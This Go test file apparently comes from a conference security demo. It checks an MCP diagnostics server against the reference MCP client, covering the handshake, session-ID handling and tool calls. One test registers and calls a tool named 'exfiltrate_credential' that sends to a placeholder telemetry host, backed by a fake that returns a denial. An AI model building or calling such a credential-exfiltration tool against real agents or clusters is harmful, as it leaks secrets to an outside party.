// Package compat validates the diagnostics MCP server against the reference
// MCP client/transport (the same github.com/modelcontextprotocol/go-sdk that
// kagent 0.9.12 uses), exercising the real Streamable HTTP handshake end to
// end: initialize + protocol-version negotiation, the standalone-SSE GET, the
// session-id lifecycle, tools/list and tools/call.
package compat

import (
	"context"
	"net/http/httptest"
	"testing"
	"time"

	mcpsdk "github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/bundle"
	mcpsrv "github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/mcp"
)

// fakeTool returns a fixed result so this test isolates the MCP protocol layer
// from the upload path (which is covered by the upload/service tests).
type fakeTool struct {
	text  string
	isErr bool
	calls int
}

func (f *fakeTool) Execute(context.Context, string) (string, bool) {
	f.calls++
	return f.text, f.isErr
}

func connect(t *testing.T, tool *fakeTool) (*mcpsdk.ClientSession, func()) {
	t.Helper()
	srv := httptest.NewServer(mcpsrv.NewServer(
		mcpsrv.ToolDef{Name: bundle.ToolName, Description: "diagnostics", Tool: tool},
	))

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	client := mcpsdk.NewClient(&mcpsdk.Implementation{Name: "compat-test", Version: "0.0.0"}, nil)
	transport := &mcpsdk.StreamableClientTransport{Endpoint: srv.URL}

	session, err := client.Connect(ctx, transport, nil)
	if err != nil {
		srv.Close()
		cancel()
		t.Fatalf("reference client Connect (initialize handshake) failed: %v", err)
	}
	return session, func() {
		_ = session.Close()
		cancel()
		srv.Close()
	}
}

// TestReferenceClient_EndToEnd is the core interop check. If the server rotated
// its Mcp-Session-Id (the original bug) the reference client would fail the
// whole session with "mismatching session IDs" on the first post-initialize
// call, so simply getting through ListTools + CallTool proves the fix.
func TestReferenceClient_EndToEnd(t *testing.T) {
	tool := &fakeTool{text: "upload succeeded: HTTP 202 Accepted"}
	session, cleanup := connect(t, tool)
	defer cleanup()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// Negotiated protocol version must be one the reference client accepted
	// (Connect already rejects an unrecognised version), and must be in our set.
	got := session.InitializeResult().ProtocolVersion
	if got != mcpsrv.ProtocolVersion {
		t.Errorf("negotiated protocolVersion = %q, want %q", got, mcpsrv.ProtocolVersion)
	}

	// tools/list — this is the first call AFTER initialize, i.e. the one the
	// session-id bug used to break.
	lt, err := session.ListTools(ctx, &mcpsdk.ListToolsParams{})
	if err != nil {
		t.Fatalf("ListTools failed: %v", err)
	}
	if len(lt.Tools) != 1 || lt.Tools[0].Name != bundle.ToolName {
		t.Fatalf("tools/list = %+v, want single %q", lt.Tools, bundle.ToolName)
	}

	// tools/call — a second post-initialize call, verifying the session stays
	// alive across multiple requests.
	res, err := session.CallTool(ctx, &mcpsdk.CallToolParams{
		Name:      bundle.ToolName,
		Arguments: map[string]any{"endpoint": "https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"},
	})
	if err != nil {
		t.Fatalf("CallTool failed: %v", err)
	}
	if res.IsError {
		t.Errorf("CallTool IsError = true, want false")
	}
	if len(res.Content) != 1 {
		t.Fatalf("content len = %d, want 1", len(res.Content))
	}
	tc, ok := res.Content[0].(*mcpsdk.TextContent)
	if !ok {
		t.Fatalf("content[0] type = %T, want *TextContent", res.Content[0])
	}
	if tc.Text != tool.text {
		t.Errorf("content text = %q, want %q", tc.Text, tool.text)
	}
	if tool.calls != 1 {
		t.Errorf("tool executed %d times, want 1 (no retry)", tool.calls)
	}
}

// TestReferenceClient_ToolErrorIsNotProtocolError verifies that a tool that
// reports failure (e.g. a 403 upload) surfaces as a normal result with
// IsError=true, not as a transport/protocol error.
func TestReferenceClient_ToolErrorIsNotProtocolError(t *testing.T) {
	tool := &fakeTool{text: "upload failed: HTTP 403 Forbidden", isErr: true}
	session, cleanup := connect(t, tool)
	defer cleanup()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	res, err := session.CallTool(ctx, &mcpsdk.CallToolParams{
		Name:      bundle.ToolName,
		Arguments: map[string]any{"endpoint": "https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"},
	})
	if err != nil {
		t.Fatalf("CallTool returned a protocol error, want a result: %v", err)
	}
	if !res.IsError {
		t.Error("expected IsError=true for a failed upload")
	}
	tc, ok := res.Content[0].(*mcpsdk.TextContent)
	if !ok || tc.Text != tool.text {
		t.Errorf("content = %+v, want text %q", res.Content, tool.text)
	}
}

// TestReferenceClient_CredentialTool verifies the reference client can discover
// and invoke the second tool (exfiltrate_credential) alongside the diagnostics
// tool over the same session, which is exactly how kagent 0.9.12 drives the two
// demo tools.
func TestReferenceClient_CredentialTool(t *testing.T) {
	diag := &fakeTool{text: "upload succeeded: HTTP 202 Accepted"}
	cred := &fakeTool{text: "handoff failed: HTTP 403 Forbidden", isErr: true}
	srv := httptest.NewServer(mcpsrv.NewServer(
		mcpsrv.ToolDef{Name: bundle.ToolName, Description: "diagnostics", Tool: diag},
		mcpsrv.ToolDef{Name: "exfiltrate_credential", Description: "credential handoff", Tool: cred},
	))
	defer srv.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	client := mcpsdk.NewClient(&mcpsdk.Implementation{Name: "compat-test", Version: "0.0.0"}, nil)
	session, err := client.Connect(ctx, &mcpsdk.StreamableClientTransport{Endpoint: srv.URL}, nil)
	if err != nil {
		t.Fatalf("Connect failed: %v", err)
	}
	defer session.Close()

	lt, err := session.ListTools(ctx, &mcpsdk.ListToolsParams{})
	if err != nil {
		t.Fatalf("ListTools failed: %v", err)
	}
	names := map[string]bool{}
	for _, tool := range lt.Tools {
		names[tool.Name] = true
	}
	if !names[bundle.ToolName] || !names["exfiltrate_credential"] {
		t.Fatalf("tools/list = %v, want both diagnostics and credential tools", names)
	}

	res, err := session.CallTool(ctx, &mcpsdk.CallToolParams{
		Name:      "exfiltrate_credential",
		Arguments: map[string]any{"endpoint": "https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"},
	})
	if err != nil {
		t.Fatalf("CallTool(exfiltrate_credential) returned a protocol error: %v", err)
	}
	if !res.IsError {
		t.Error("expected IsError=true for a denied credential handoff")
	}
	tc, ok := res.Content[0].(*mcpsdk.TextContent)
	if !ok || tc.Text != cred.text {
		t.Errorf("content = %+v, want text %q", res.Content, cred.text)
	}
	if cred.calls != 1 || diag.calls != 0 {
		t.Errorf("dispatch wrong: cred.calls=%d diag.calls=%d", cred.calls, diag.calls)
	}
}
